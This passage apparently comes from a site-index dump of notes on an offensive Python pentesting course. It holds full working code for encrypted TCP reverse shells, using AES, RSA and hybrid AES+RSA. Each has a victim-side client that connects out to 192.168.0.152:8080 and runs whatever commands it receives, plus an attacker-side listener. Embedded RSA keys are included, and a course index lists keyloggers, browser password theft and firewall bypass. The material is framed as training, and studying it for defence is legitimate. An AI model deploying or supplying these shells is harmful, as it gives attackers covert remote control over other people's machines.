</li> <li>Making a screenshot. </li> <li>Coding a reverse shell that searches files. </li> </ul> </li> <li>Techniques for bypassing filters: <ul> <li>Coding a reverse shell that scans ports. </li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall.</li> <li>Bypassing Next Generation Firewalls.</li> <li>Bypassing IPS with handmade XOR Encryption.</li> </ul> </li> <li>Malware and crytography:<ul> <li>TCP reverse shell with AES encryption.</li> <li>TCP reverse shell with RSA encryption.</li> <li>TCP reverse shell with hybrid encryption AES + RSA.</li> </ul> </li> <li>Password Hickjacking:<ul> <li>Simple keylogger in python.</li> <li>Hijacking Keepass Password Manager.</li> <li>Dumping saved passwords from Google Chrome.</li> <li>Man in the browser attack.</li> <li>DNS Poisoning.</li> </ul> </li> <li>Privilege escalation:<ul> <li>Weak service file permission.</li> </ul> </li> </ul>","tags":["python","python pentesting","scripting","reverse shell","encryption","aes"]},{"location":"python/tcp-reverse-shell-with-aes-encryption/#client-side","title":"Client side","text":"<p>To be run on the victim's machine.</p> <pre><code>from Cryptodome.Cipher import AES\nfrom Cryptodome.Util import Padding\nimport socket\nimport subprocess\nkey = b\"H\" * 32\nIV = b\"H\" * 16\n\ndef encrypt(message):\n    encryptor = AES.new(key, AES.MODE_CBC, IV)\n    padded_message = Padding.pad(message, 16)\n    encrypted_message = encryptor.encrypt(padded_message)\n    return encrypted_message\n\ndef decrypt(cipher):\n    decryptor = AES.new(key, AES.MODE_CBC, IV)\n    decrypted_padded_message = decryptor.decrypt(cipher)\n    decrypted_message = Padding.unpad(decrypted_padded_message, 16)\n    return decrypted_message\n\ndef connect():\n    s = socket.socket()\n    s.connect(('192.168.0.152', 8080))\n    while True:\n        command = decrypt(s.recv(1024))\n        if 'terminate' in command.decode():\n             break\n        else:\n            CMD = subprocess.Popen(command.decode(), shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE)\n            s.send(encrypt(CMD.stdout.read()))\n\n\ndef main():\n    connect()\nmain()\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell","encryption","aes"]},{"location":"python/tcp-reverse-shell-with-aes-encryption/#server-side","title":"Server side","text":"<pre><code>import socket\n\nfrom Cryptodome.Cipher import AES\nfrom Cryptodome.Util import Padding\n\nIV = b\"H\" * 16 # this must match the block size, which is 16 byte\nkey = b\"H\" * 32 # 32 goes for AES 256\n\ndef encrypt(message):\n    encryptor = AES.new(key, AES.MODE_CBC, IV)\n    padded_message = Padding.pad(message, 16) # pad function is to add the necessary extra data to make sure that the size of the padded_message is 16 bytes or a multiple of 16. This is explained because cipher block chaining encryption uses blocks of 16bytes.\n    encrypted_message = encryptor.encrypt(padded_message) \n    return encrypted_message\n\ndef decrypt(cipher):\n    decryptor = AES.new(key, AES.MODE_CBC, IV)\n    decrypted_padded_message = decryptor.decrypt(cipher)\n    decrypted_message = Padding.unpad(decrypted_padded_message, 16)\n    return decrypted_message\n\ndef connect():\n\n    s = socket.socket()\n    s.bind(('192.168.0.152', 8080))\n    s.listen(1)\n    conn, address = s.accept()\n    print('[+] We got a connection')\n    while True:\n\n        command = input(\"Shell&gt; \")\n        if 'terminate' in command:\n            conn.send(encrypt(b'terminate'))\n            conn.close()\n            break\n        else:\n            command = encrypt(command.encode())\n            conn.send(command)\n            print(decrypt(conn.recv(1024)).decode())\ndef main():\n    connect()\n\nmain()\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell","encryption","aes"]},{"location":"python/tcp-reverse-shell-with-aes-encryption/#test","title":"Test","text":"<pre><code># Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn  https://jo.linkedin.com/in/python2\n\n\nfrom Cryptodome.Cipher import AES\nfrom Cryptodome.Util import Padding\n\nkey = b\"H\" * 32 #AES keys may be 128 bits (16 bytes), 192 bits (24 bytes) or 256 bits (32 bytes) long.\nIV = b\"H\" * 16\n\ncipher = AES.new(key, AES.MODE_CBC, IV)\n\nmessage = \"Hello\"\npaddedmessage = Padding.pad(message.encode(), 16)\nencrypted = cipher.encrypt(paddedmessage)\n\nprint (encrypted)\n\n\ndecipher = AES.new(key, AES.MODE_CBC, IV)\npaddeddecrypted = decipher.decrypt(encrypted)\nunpaddedencrypted = Padding.unpad(paddeddecrypted, 16)\n\nprint(unpaddedencrypted.decode())\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell","encryption","aes"]},{"location":"python/tcp-reverse-shell-with-hybrid-encryption-rsa-aes/","title":"TCP reverse shell with hybrid encryption AES + RSA","text":"<p>From course: Python For Offensive PenTest: A Complete Practical Course.</p> General index of the course <ul> <li>Gaining persistence shells (TCP + HTTP):<ul> <li>Coding a TCP connection and a reverse shell.</li> <li>Coding a low level data exfiltration  - TCP connection.</li> <li>Coding an http reverse shell.</li> <li>Coding a data exfiltration script for a http shell.</li> <li>Tunning the connection attempts.</li> <li>Including cd command into TCP reverse shell.</li> </ul> </li> <li>Advanced scriptable shells:<ul> <li>Using a Dynamic DNS instead of your bared attacker public ip.</li> <li>Making your binary persistent. </li> <li>Making a screenshot. </li> <li>Coding a reverse shell that searches files. </li> </ul> </li> <li>Techniques for bypassing filters: <ul> <li>Coding a reverse shell that scans ports. </li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall.</li> <li>Bypassing Next Generation Firewalls.</li> <li>Bypassing IPS with handmade XOR Encryption.</li> </ul> </li> <li>Malware and crytography:<ul> <li>TCP reverse shell with AES encryption.</li> <li>TCP reverse shell with RSA encryption.</li> <li>TCP reverse shell with hybrid encryption AES + RSA.</li> </ul> </li> <li>Password Hickjacking:<ul> <li>Simple keylogger in python.</li> <li>Hijacking Keepass Password Manager.</li> <li>Dumping saved passwords from Google Chrome.</li> <li>Man in the browser attack.</li> <li>DNS Poisoning.</li> </ul> </li> <li>Privilege escalation:<ul> <li>Weak service file permission.</li> </ul> </li> </ul>","tags":["python","python pentesting","scripting","reverse shell","encryption","aes","rsa"]},{"location":"python/tcp-reverse-shell-with-hybrid-encryption-rsa-aes/#client-side","title":"Client side","text":"<p>To be run on the victim's machine.</p> <pre><code>import subprocess\nimport socket\nfrom Cryptodome.Cipher import PKCS1_OAEP\nfrom Cryptodome.PublicKey import RSA\nfrom Cryptodome.Cipher import AES\nfrom Cryptodome.Util import Padding\n\nIV = b\"H\" * 16\n\ndef GET_AES(cipher):\n    privatekey = '''-----BEGIN RSA PRIVATE KEY-----\nMIIJKQIBAAKCAgEAt9mjsBED9D/MYnU+W5+6aP9SS1vgL9X6bThNkGKsZ5ZVfnoK\n4BxMBHI5Gi/YtoCJjyAGsWMpxy1fQ+F+ZWVAkwZDoQMWTrfZASHmQgB944PfGA7q\nfn15kDXmCyvzbitRyWvTs1LDDNF7Q/54Qj82h/85ibOPzQrpwQTjEAs8CJ14YWXA\nJnqOC6devaDYKdB7SSlueVtoQ8BxWc3hOJHJpvgZQ/6NixnICLIrFN0YbKZo4A0D\n3yRJIdumZw8uqwEMeIt41ja6zOG3gKtsG8suBZ/MvqX0WgojWr6hNs1Q8h3LtiSs\nPiUP/bTWD9zos8Yr7RuEabesjHlY0qcNzZ/YgKXdgxUkCikTjRon6Mvh7iWKAtEi\nlQlDeBYMGUvFUQ5FMF5LZJ5Q/7+JXulv8WhqKTp4dGpB3kUWuN+ltxBr+IYPhpBf\nMcR97W+NuXDReUiIGFJpVI1m4AeCzz1BdAM7U928DcglK6IowMmN4McyKuv49YYP\nd7TNFjJWc7P6e19V3BsxA5jpCc6Dxp5AM6WC0FqgSSOGVCIkcHT5wLcALyaXOaO0\nvhMgWWO233Of33wh/7oHclsc5r44MHlZrNSeX2QIHCFU4Mwp1hutIuIKkn5dLt1q\nmt2CDUO/uxGbdTf667c9TLYcYWoi/eDBdrVx7CkYI7g81RdcB6jGgbr9W4kCAwEA\nAQKCAgAIZt7PJgfrOpspiLgf0c3gDIMDRKCbLwkxwpfw2EGOvlUL4aHrmf9zWJD5\nfGRH+tnOe6UyqBh5rL4kyQJQue7YiTm/+vcjA83b+mOeco1OP3GLlOrseul6SKxJ\nqGmIiFxFezMCh+64AD7E3bU7Oc5RKr3DaDxTH4ONOZ7y1cCZmDCvKso8N++T4sM2\noUofpxJrRoRw8VdzeTD07K61OhxgEAh/jfuD9tqoYxQK8Quzs2spig66PNtGu9X/\n8batQ/AA9kbAa2HgCRSswajAIGnrAeGGeOkQ0FPLStjtOzbOycPMgCKK+IChlIkP\n0oWj6ZOKU26asjUlekov3kiINBzduF+bGOKGnoxeguSiQE1DtsfXisvADMp53rLN\nRjkzWDTN7l8zqgAd2hPB25Fhy5kKHA1MNqRPeUUIUp++FuYVJ1xNoMR61N6JvLzC\nUTrUZW7mMxqXisccsuU8OdGB2DECP+sS82dWZqoKFZKjza1N5XBSm1f7nCTQqtJq\nkYYA5d4FPJ1wxRKufRTklC6QSHoGm54z0ay4Mh0n08wIiYBRxsgtGk6crhpRfy12\ne6lRU3htQnzc+JDrdZIjoL5lqDfi0wSxdVXAAQXRptsvSXwwt+h/zg9ZmqlsVoE1\nhH7LeVyL31FRF1b2BiX7jyOeeoqZ1gkkNvwyvqnaOos+wGd2/QKCAQEA0aeVV0HM\nHpJ7hUib/btWbX/zYQEwQRRCbHWGsxROumkJPgfRzPhDohDgv4ncrX0w7+4PESGp\n9MNZBa9kPuwDNFsVxIdpWZgmJdALqLwpWPnGswwVp6Lk1jMHD2GxLkknHLvfmND3\nfuqVj7k/bKFayqejlY2SyNUv/h+DsQQL2esM8A4TLGlFOgfaoz0wPii2HmANQPSa\n16xjV/0uQGHW260d1norNVZCmRDC3Gqz8/rcTGYwEkeCCQ3ctlUJyAFVu+ILyIga\n/kadDqiUkItIKl+fQI3stPyrHjh5cMUk+kPMjO36/yQ0f3Ox8cUkR5x3eW4RoFZQ\n/khhdDqVmieQ/wKCAQEA4H3GCf1LijS7069AEyvOKcKTL+nDGdqz+xMc+sbtha37\n8hh9mjvFaljJcKb4AxTTnT8RrCnabdtmuAXRsfHOu1BZdJAaW+hgWgY+PJL+XpBQ\n8D3954EvE2aX910DDMYz2slm0IL5we8KLg76ZHi+zO8woeedSD7yHbox6ybHZr0H\nL7G8fwI9zg/oz7+0P+vU3AV5hgnUDx5kY1hYNWmrBkgObRfJQNsiCDHkw6wRZPU+\nXESQX2iUnh8HA7idWvLELFXjueHxEw15yKaw9toiO0T1MhbrBBsjElXDk6WuKmVj\nC2/ZvG939IOO2cW8UeBdTABhO630QQdDtAk0YqILdwKCAQEAjm1UrSSL8LD+rPs4\nzdS40Ea+JkZSa8PBpEDrMzk2irjUiIlzY9W8zJq+tCCKBGoqFrUZE0BVX2xeS9ht\nN7nKK4U9cnezgCQ2tjVx1j2NsV5uODCbfXjSERo1T6PEZHdZ1NFlA0HjARuIY00r\n4zZyoX3lSbIV5828ft0V7+mZy389GM/XArK5TsULKR5mabPqlRQXrOr/TklUa/AZ\nva858Z7XyF7Sf7eMIsQaPPdYLQVdJ6G8Qo7FrjT2nf+DV5ZgkfTsoFymSdva0px/\n4PpeGjs/yvEfv4xvC2a+SXgEuOfaTFtXyoDkETmdx2twTB3lpF68Jrq85yJw4i7y\ndvkuLQKCAQBefJGeIr5orUlhD6Iob4eWjA7nW7yCZUrbom/QHWpbmZ8xhp1XDVFK\nMZSXla9NnLZ0uNb3X6ZQFshlLA3Wl7ArpuX/6acuh+AGBBqt5DCsHJH0jCMSDY2C\n3OuZccyW09V/gMWFfZshxTrDqAo7v5aPKx2NB69reRLu8C+Sif/jfixIJsbvrkHV\nOV0EE+wJ+3jcInHDuN9IfcJDDiwSTydsvWdVA23xnkn0qQtgUEwB8jcNHs6lWZ8z\n7ltFda7FWOi4wG3ZDwAoxMM9cOuK+sTtrViGfJ7uW32nefGXc2Sa85F8ftdmOISE\npdq6Tj+1NnoOQxqpw83KkQQuArHJ0eqBAoIBAQDPchq4XMwlEfjVjZCJEX++UyEA\n5H2hKbWOXU9WNhZCKmScrAlkW/6L0lHs1mngfxxavKOy2jIoUhb2/zeA/MKx6Jxa\nPqiKaOdqTYn6yaLkRS+7jUndDeFqDVCLqt3NprltVzLphjOB0I8PsUnIj5lKcE5K\nDjtbjnJYCjj0o346t3abOOoqxqYJmXgieRWkjjidkBOvL/Td7OZXM6jPVj744+ZE\nK2D/g7XtAIOACmSpYTtHRl7bxcoKP7QiPksNG17w+LWUqF2TwBexyCDKCV5XSIB9\nYVPwkPTGTNbOtTuTJk5hO+W4Nij4ERDdQlxd961YgRHORov+2sFREdhbrV0s\n-----END RSA PRIVATE KEY-----'''\n    private_key = RSA.importKey(privatekey)\n    decryptor = PKCS1_OAEP.new(private_key)\n    return decryptor.decrypt(cipher).decode()\n\n\ndef encrypt(message):\n    encryptor = AES.new(AES_KEY, AES.MODE_CBC, IV)\n    padded_message = Padding.pad(message, 16)\n    encrypted_message = encryptor.encrypt(padded_message)\n    return encrypted_message\n\ndef decrypt(cipher):\n    decryptor = AES.new(AES_KEY, AES.MODE_CBC, IV)\n    decrypted_padded_message = decryptor.decrypt(cipher)\n    decrypted_message = Padding.unpad(decrypted_padded_message,\n                                      16)\n    return decrypted_message\n\n\ndef connect():\n    s = socket.socket()\n    s.connect(('192.168.0.152', 8080))\n    global AES_KEY\n    AES_KEY = s.recv(1024)\n    AES_KEY = GET_AES(AES_KEY)\n    AES_KEY = AES_KEY.encode()\n    print(AES_KEY)\n\n    while True:\n        command = s.recv(1024)\n\n        command = decrypt(command).decode()\n        print (command)\n        if 'terminate' in command:\n            s.close()\n            break\n        else:\n            CMD = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)\n            result = CMD.stdout.read()\n            s.send(encrypt(result))\nconnect()\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell","encryption","aes","rsa"]},{"location":"python/tcp-reverse-shell-with-hybrid-encryption-rsa-aes/#server-side","title":"Server side","text":"<pre><code>import socket\nfrom Cryptodome.PublicKey import RSA\nfrom Cryptodome.Cipher import PKCS1_OAEP\nfrom Cryptodome.Cipher import AES\nfrom Cryptodome.Util import Padding\nimport string\nimport random\n\nIV = b\"H\" * 16\n\n\nkey = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!\\$%&amp;/()=?{[]}+~#-_.:,;&lt;&gt;|\\\\') for _ in range(0, 32))\n\n\ndef SEND_AES(message):\n    publickey = '''-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAt9mjsBED9D/MYnU+W5+6\naP9SS1vgL9X6bThNkGKsZ5ZVfnoK4BxMBHI5Gi/YtoCJjyAGsWMpxy1fQ+F+ZWVA\nkwZDoQMWTrfZASHmQgB944PfGA7qfn15kDXmCyvzbitRyWvTs1LDDNF7Q/54Qj82\nh/85ibOPzQrpwQTjEAs8CJ14YWXAJnqOC6devaDYKdB7SSlueVtoQ8BxWc3hOJHJ\npvgZQ/6NixnICLIrFN0YbKZo4A0D3yRJIdumZw8uqwEMeIt41ja6zOG3gKtsG8su\nBZ/MvqX0WgojWr6hNs1Q8h3LtiSsPiUP/bTWD9zos8Yr7RuEabesjHlY0qcNzZ/Y\ngKXdgxUkCikTjRon6Mvh7iWKAtEilQlDeBYMGUvFUQ5FMF5LZJ5Q/7+JXulv8Whq\nKTp4dGpB3kUWuN+ltxBr+IYPhpBfMcR97W+NuXDReUiIGFJpVI1m4AeCzz1BdAM7\nU928DcglK6IowMmN4McyKuv49YYPd7TNFjJWc7P6e19V3BsxA5jpCc6Dxp5AM6WC\n0FqgSSOGVCIkcHT5wLcALyaXOaO0vhMgWWO233Of33wh/7oHclsc5r44MHlZrNSe\nX2QIHCFU4Mwp1hutIuIKkn5dLt1qmt2CDUO/uxGbdTf667c9TLYcYWoi/eDBdrVx\n7CkYI7g81RdcB6jGgbr9W4kCAwEAAQ==\n-----END PUBLIC KEY-----'''\n    public_key = RSA.importKey(publickey)\n    encryptor = PKCS1_OAEP.new(public_key)\n    encryptedData = encryptor.encrypt(message)\n    return encryptedData\n\n\n\n\ndef encrypt(message):\n    encryptor = AES.new(key.encode(), AES.MODE_CBC, IV)\n    padded_message = Padding.pad(message, 16)\n    encrypted_message = encryptor.encrypt(padded_message)\n    return encrypted_message\n\ndef decrypt(cipher):\n    decryptor = AES.new(key.encode(), AES.MODE_CBC, IV)\n    decrypted_padded_message = decryptor.decrypt(cipher)\n    decrypted_message = Padding.unpad(decrypted_padded_message,\n                                      16)\n    return decrypted_message\n\n\ndef connect():\n    s = socket.socket()\n    s.bind(('192.168.0.152', 8080))\n    s.listen(1)\n    print('[+] Listening for incoming TCP connection on port 8080')\n\n    conn, addr = s.accept()\n    print(key.encode())\n    conn.send(SEND_AES(key.encode()))\n\n    while True:\n        store = ''\n        command = input(\"Shell&gt; \")\n        if 'terminate' in command:\n            conn.send('terminate'.encode())\n            conn.close()\n            break\n        else:\n            command = encrypt(command.encode())\n            conn.send(command)\n            result = conn.recv(1024)\n            try:\n                print(decrypt(result).decode())\n            except:\n                print(\"[-] unable to decrypt/receive data!\")\n\nconnect()\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell","encryption","aes","rsa"]},{"location":"python/tcp-reverse-shell-with-rsa-encryption/","title":"TCP reverse shell with RSA encryption","text":"<p>From course: Python For Offensive PenTest: A Complete Practical Course.</p> General index of the course <ul> <li>Gaining persistence shells (TCP + HTTP):<ul> <li>Coding a TCP connection and a reverse shell.</li> <li>Coding a low level data exfiltration  - TCP connection.</li> <li>Coding an http reverse shell.</li> <li>Coding a data exfiltration script for a http shell.</li> <li>Tunning the connection attempts.</li> <li>Including cd command into TCP reverse shell.</li> </ul> </li> <li>Advanced scriptable shells:<ul> <li>Using a Dynamic DNS instead of your bared attacker public ip.</li> <li>Making your binary persistent. </li> <li>Making a screenshot. </li> <li>Coding a reverse shell that searches files. </li> </ul> </li> <li>Techniques for bypassing filters: <ul> <li>Coding a reverse shell that scans ports. </li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall.</li> <li>Bypassing Next Generation Firewalls.</li> <li>Bypassing IPS with handmade XOR Encryption.</li> </ul> </li> <li>Malware and crytography:<ul> <li>TCP reverse shell with AES encryption.</li> <li>TCP reverse shell with RSA encryption.</li> <li>TCP reverse shell with hybrid encryption AES + RSA.</li> </ul> </li> <li>Password Hickjacking:<ul> <li>Simple keylogger in python.</li> <li>Hijacking Keepass Password Manager.</li> <li>Dumping saved passwords from Google Chrome.</li> <li>Man in the browser attack.</li> <li>DNS Poisoning.</li> </ul> </li> <li>Privilege escalation:<ul> <li>Weak service file permission.</li> </ul> </li> </ul> <p>First, we will generate a pair of keys (private and public) on client side (victim's machine) and on server side (attacker machine).</p>","tags":["python","python pentesting","scripting","reverse shell","encryption","rsa"]},{"location":"python/tcp-reverse-shell-with-rsa-encryption/#gen-keys","title":"Gen keys","text":"<pre><code># Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn  https://jo.linkedin.com/in/python2\n\n\nfrom Cryptodome.PublicKey import RSA\n\nnew_key = RSA.generate(4096) # generate  RSA key that 4096 bits long\n\n#Export the Key in PEM format, the PEM extension contains ASCII encoding\npublic_key = new_key.publickey().exportKey(\"PEM\")\nprivate_key = new_key.export_key(\"PEM\")\n\npublic_key_file = open(\"public.pem\", \"wb\")\npublic_key_file.write(public_key)\npublic_key_file.close()\n\nprivate_key_file = open(\"private.pem\", \"wb\")\nprivate_key_file.write(private_key)\nprivate_key_file.close()\n\nprint(public_key.decode())\nprint(private_key.decode())\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell","encryption","rsa"]},{"location":"python/tcp-reverse-shell-with-rsa-encryption/#rsa-client-side-shell","title":"RSA client side shell","text":"<pre><code>import subprocess\nimport socket\nfrom Cryptodome.Cipher import PKCS1_OAEP\nfrom Cryptodome.PublicKey import RSA\ndef decrypt(cipher):\n    privatekey = '''-----BEGIN RSA PRIVATE KEY-----\n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\n-----END RSA PRIVATE KEY-----'''\n    private_key = RSA.importKey(privatekey)\n    decryptor = PKCS1_OAEP.new(private_key)\n    return decryptor.decrypt(cipher).decode()\n\ndef encrypt(message):\n    publickey = '''-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEApceMHQ9c5Cdf+qgd4ASP\nM7WNbKavEwat78bMHQVK6cRNm2XSWCLpTsYN2eUALV++dYi2Im0T92bqYojRm+p4\nvVKOvrdmcmfnITEw/++pbvGZYRf2y0zsSJi1Mi+lfgQs56QXBMIU6IdeCL2C7cex\n9LNJ98ipGeN6nBiaExI9he3PcivztD5vHowCwkbzAnpZgPamrN10/KukWKvJ3t05\nbc0MskjkhVaaN55eidzAXUmYmxyoLeke1GssiU+TInZQXbSiUeeFsZpkMjYX4nCS\nxT/TuuFaDy6tfpfM+ePNEgeLjn7WAJh2ApxaYhmqwbDTsXd0ldHc4iNeGmlaEGE9\nDgXPSp7ljV9SZ7eO9LZuiERz003NrUqSKSHdYgEIH8wZrCiKSP471oNYn0ye+KdV\n/v25dqTXApO3QO/LZrJQ8twQyASR1LB3tTVYGuNpRVLlNC4j4ivL22uDCbGOIBOa\nKDmu/QR5imLdjj3alVg69Ci3It3jTlubtHDaXTVs+i1133fOKMnRPLmCHE1/6MMS\ni1BzDF46Q2XJwjgDnH5rk70n7sVquQtpHZkpQsuSSrjiL9Bi3jYghReVfFHC7aNF\np42v7EMaLohpnFm6yKiEm5UacMs7rLdnUQtAKo3r5UiNAegY6h/ZDncGhah1e5wF\ndBPIb9wJyTjPYTiTJ3rDQGECAwEAAQ==\n-----END PUBLIC KEY-----'''\n    public_key = RSA.importKey(publickey)\n    encryptor = PKCS1_OAEP.new(public_key)\n    encryptedData = encryptor.encrypt(message)\n    return encryptedData\n\ndef connect():\n    s = socket.socket()\n    s.connect(('192.168.0.152', 8080))\n    while True:\n        command = s.recv(1024)\n\n        command = decrypt(command)\n        print (command)\n        if 'terminte' in command:\n            s.close()\n            break\n        else:\n            CMD = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)\n            result = CMD.stdout.read()\n            print (len(result))\n            if len(result) &gt; 470:\n                for i in range(0, len(result), 470):\n                    chunk = result[0+i:470+i]\n                    s.send(encrypt(chunk))\n            else:\n                s.send(encrypt(result))\nconnect()\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell","encryption","rsa"]},{"location":"python/tcp-reverse-shell-with-rsa-encryption/#rsa-enc-big-message","title":"RSA Enc Big Message","text":"<pre><code>from Cryptodome.PublicKey import RSA\nfrom Cryptodome.Cipher import PKCS1_OAEP\n\ndef decrypt(cipher):\n    privatekey = open(\"private.pem\", \"rb\")\n    private_key = RSA.importKey(privatekey.read())\n    decryptor = PKCS1_OAEP.new(private_key)\n    print (decryptor.decrypt(cipher).decode())\n\n\ndef encrypt(message):\n    publickey = open(\"public.pem\", \"rb\")\n    public_key = RSA.importKey(publickey.read())\n    encryptor = PKCS1_OAEP.new(public_key)\n    encrypted_data = encryptor.encrypt(message)\n    print(encrypted_data)\n    decrypt(encrypted_data)\n\nmessage = 'H'*500\n\nif len(message) &gt; 470: # To check the size limitation of messages, which is 470 bites when key size is 4096 bits\n    for i in range(0, len(message), 470): # We will split the messages into chunks so it can be processed\n        chunk = message[0+i:470+i]\n        encrypt(chunk.encode())\nelse:\n    encrypt(message.encode())\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell","encryption","rsa"]},{"location":"python/tcp-reverse-shell-with-rsa-encryption/#rsa-enc-small-messages","title":"RSA Enc Small messages","text":"<pre><code>from Cryptodome.PublicKey import RSA\nfrom 